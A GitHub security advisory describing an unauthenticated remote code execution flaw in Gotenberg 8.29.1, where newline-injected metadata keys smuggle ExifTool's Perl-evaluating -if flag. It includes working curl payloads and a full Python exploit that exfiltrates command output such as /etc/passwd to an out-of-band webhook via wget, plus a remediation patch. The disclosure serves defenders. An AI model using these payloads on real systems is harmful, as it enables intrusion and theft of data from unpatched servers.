# [C] Gotenberg has Unauthenticated RCE via ExifTool Metadata Key Injection

## Summary
Severity: Critical
Advisory: GHSA-rqgh-gxv4-6657
CVE: CVE-2026-42589
CWE: CWE-78
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-rqgh-gxv4-6657
Type: github-advisory

## Affected
- Go: `github.com/gotenberg/gotenberg/v8` — affected 8.29.1

## Details
# Unauthenticated RCE in Gotenberg via Metadata Key Newline Injection

## Summary

Gotenberg's `/forms/pdfengines/metadata/write` HTTP endpoint accepts a JSON metadata object and passes its keys directly to ExifTool via the go-exiftool library. No validation is performed on key characters. A `\n` embedded in a JSON key splits the ExifTool stdin stream into a new argument line, allowing an attacker to inject arbitrary ExifTool flags — including `-if`, which evaluates Perl expressions. This achieves unauthenticated OS command execution in a single HTTP request. The response is HTTP 200 with a valid PDF, making the attack transparent to basic monitoring.

## Vulnerability Details

| Field            | Value                                    |
|------------------|------------------------------------------|
| Product          | Gotenberg                                |
| Version          | 8.29.1 (default `gotenberg/gotenberg:8`) |
| Component        | `pdfengines/metadata/write` endpoint     |
| CWE              | CWE-78 — Improper Neutralization of Special Elements used in an OS Command |

## Affected Code

**Product:** Gotenberg  
**Endpoint:** `/forms/pdfengines/metadata/write`  
**Root cause:** JSON metadata keys are passed to go-exiftool without control-character
validation. The existing `dangerousTags` blocklist uses exact-match deletion and
provides no defense against `\n`-embedded keys.

The injection occurs because go-exiftool writes each key to ExifTool's stdin as:

```go
fmt.Fprintln(e.stdin, "-"+k+"="+str)   // k contains \n → splits into a new argument line
```

When `k` is `Title\n-if\nsystem('cmd')||1\n-Comment`, ExifTool's stdin becomes:

```
-Title
-if
system('cmd')||1
-Comment=x
```

ExifTool's `-if` flag evaluates its argument as a Perl expression, giving the attacker arbitrary code execution.

**Why it's vulnerable:** Gotenberg is the HTTP entry point. It controls what data enters go-exiftool. The `dangerousTags` blocklist (`FileName`, `Directory`) shows that the authors are aware that certain keys are dangerous, but the fix is incomplete: it uses exact string matching and does not strip or reject control characters in keys.
This vulnerability exists entirely within Gotenberg's responsibility and is independently fixable without changing go-exiftool.

## Attack Scenario

**Threat actor:** Unauthenticated remote attacker  
**Preconditions:** Gotenberg port 3000 is reachable (common in internal/cloud deployments)  

1. Attacker sends a POST request to `/forms/pdfengines/metadata/write` with any valid PDF and a metadata JSON object whose key contains embedded newlines.
2. Gotenberg deserializes the JSON key — `\n` is preserved as a literal newline in Go's  `map[string]any` after `json.Unmarshal`.
3. The key is forwarded to go-exiftool, which writes it verbatim to ExifTool's stdin, splitting it across multiple argument lines.
4. ExifTool processes `-if system('cmd')||1` as a Perl expression and executes `cmd`.
5. The attacker exfiltrates output via an OOB HTTP callback. Response to the attacker is HTTP 200 with a valid PDF — no error signal.

## Proof of Concept

```bash
# Write output of `id` to /tmp/pwned on the server
curl -s -o /dev/null -w "HTTP:%{http_code}" \
  -X POST http://TARGET:3000/forms/pdfengines/metadata/write \
  -F 'files=@sample.pdf;type=application/pdf' \
  --form-string $'metadata={"Title\\n-if\\nsystem(\'id>/tmp/pwned\')||1\\n-Comment": "x"}'
# → HTTP:200
# On server: uid=1001(gotenberg) gid=1001(gotenberg) groups=1001(gotenberg),0(root)
```

OOB exfiltration via base64-encoded HTTP callback:

```bash
OOB="https://webhook.site/YOUR-ID"
curl -s -o /dev/null -w "HTTP:%{http_code}" \
  -X POST http://TARGET:3000/forms/pdfengines/metadata/write \
  -F 'files=@sample.pdf;type=application/pdf' \
  --form-string "metadata={\"Title\n-if\nsystem('wget -q -O /dev/null \"${OOB}?c=\$(id|base64|tr -d \\\"=\\n\\\")\" 2>/dev/null')||1\n-Comment\": \"x\"}"
# Listener receives: GET /?c=dWlkPTEwMDEoZ290ZW5iZXJnKS4u
# Decode: echo dWlkPTEwMDEoZ290ZW5iZXJnKS4u | base64 -d → uid=1001(gotenberg)...
```

Self-contained Python PoC (auto-generates PDF from target, exfiltrates via OOB):

```python
#!/usr/bin/env python3
"""
Usage: python3 poc.py <target> <oob_url> [command]
  python3 poc.py http://localhost:3000 https://webhook.site/YOUR-ID
  python3 poc.py http://10.0.0.5:3000 https://webhook.site/YOUR-ID "cat /etc/passwd"
"""
import sys, json, subprocess, urllib.request

def check_target(target):
    with urllib.request.urlopen(f"{target}/version", timeout=5) as r:
        print(f"[+] Gotenberg {r.read().decode().strip()} — target reachable")

def get_pdf(target):
    r = subprocess.run(["curl", "-s", "-X", "POST", f"{target}/forms/chromium/convert/url",
                        "-F", "url=https://example.com"], capture_output=True, timeout=30)
    assert r.stdout[:4] == b"%PDF", "Failed to generate PDF"
    print(f"[+] Got sample PDF ({len(r.stdout)} bytes)")
    return r.stdout

def exploit(target, pdf, oob, cmd):
    import tempfile, os
    key  = f'Title\n-if\nsystem(\'wget -q -O /dev/null "{oob}?c=$({cmd}|base64|tr -d "=\\n")" 2>/dev/null\')||1\n-Comment'
    meta = json.dumps({key: "x"})
    with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as f:
        f.write(pdf); tmp = f.name
    try:
        r = subprocess.run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                            "-X", "POST", f"{target}/forms/pdfengines/metadata/write",
                            "-F", f"files=@{tmp};type=application/pdf",
                            "--form-string", f"metadata={meta}"],
                           capture_output=True, text=True, timeout=30)
        return int(r.stdout.strip())
    finally:
        os.unlink(tmp)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(__doc__); sys.exit(1)
    target, oob = sys.argv[1].rstrip("/"), sys.argv[2]
    cmd = sys.argv[3] if len(sys.argv) > 3 else "id"
    print(f"[*] Target: {target} | OOB: {oob} | Command: {cmd}")
    check_target(target)
    pdf    = get_pdf(target)
    status = exploit(target, pdf, oob, cmd)
    if status == 200:
        print(f"[+] HTTP {status} — payload fired, check OOB listener for: ?c=<base64({cmd})>")
        print(f"[!] Decode with: echo <value> | base64 -d")
    else:
        print(f"[-] HTTP {status} — unexpected response")
```

Expected output:
```
[*] Target: http://localhost:3000 | OOB: https://webhook.site/... | Command: id
[+] Gotenberg 8.29.1 — target reachable
[+] Got sample PDF (12345 bytes)
[+] HTTP 200 — payload fired, check OOB listener for: ?c=<base64(id)>
```

## Impact

Full unauthenticated remote code execution as the Gotenberg process user (`uid=1001(gotenberg)`, member of `root` group in the default Docker image). An attacker can read arbitrary files, write files, establish reverse shells, or pivot within the network. The attack requires no credentials and returns no error signal. Any deployment that exposes Gotenberg's port 3000 without an authenticating proxy is fully compromised by a single HTTP request.

## Remediation

In Gotenberg's metadata handler, reject any key containing control characters before passing it to go-exiftool:

```go
import "strings"

for key := range metadata {
    if strings.ContainsAny(key, "\n\r\x00") {
        return fmt.Errorf("invalid metadata key %q: control characters not allowed", key)
    }
}
```

Operators should also place Gotenberg behind an authenticated reverse proxy and never expose port 3000 directly to untrusted networks.

**Note:** A companion advisory covers the same class of injection at the go-exiftool library layer (independently fixable — see go-exiftool advisory).

## Timeline

| Date       | Event                                      |
|------------|--------------------------------------------|
| 2026-04-04 | Vulnerability discovered                   |
| 2026-04-04 | RCE confirmed — local file write + OOB HTTP |
| 2026-04-04 | Report drafted for disclosure              |
| 2026-04-08 | Split into separate per-product advisories |

## Resources

- CWE-78: https://cwe.mitre.org/data/definitions/78.html
- ExifTool `-if` flag: https://exiftool.org/exiftool_pod.html
- go-exiftool: https://github.com/barasher/go-exiftool
- CVSS calculator: https://www.first.org/cvss/calculator/3.1

## References
- https://github.com/gotenberg/gotenberg/security/advisories/GHSA-rqgh-gxv4-6657
- https://nvd.nist.gov/vuln/detail/CVE-2026-42589
- https://github.com/gotenberg/gotenberg
